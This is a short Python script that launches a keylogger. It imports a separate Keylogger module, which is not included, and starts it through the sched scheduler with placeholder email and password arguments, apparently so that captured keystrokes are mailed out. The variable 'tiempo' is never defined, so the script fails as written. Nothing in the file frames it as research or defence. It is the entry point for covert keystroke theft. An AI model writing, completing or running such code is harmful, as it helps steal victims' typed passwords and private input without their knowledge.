from sched import scheduler
import Keylogger
def main():
    my_keylogger = Keylogger.Keylogger(tiempo,"email","password")
    my_keylogger.start()

scheduler=scheduler()
scheduler.enter(1,0,main)

scheduler.run()
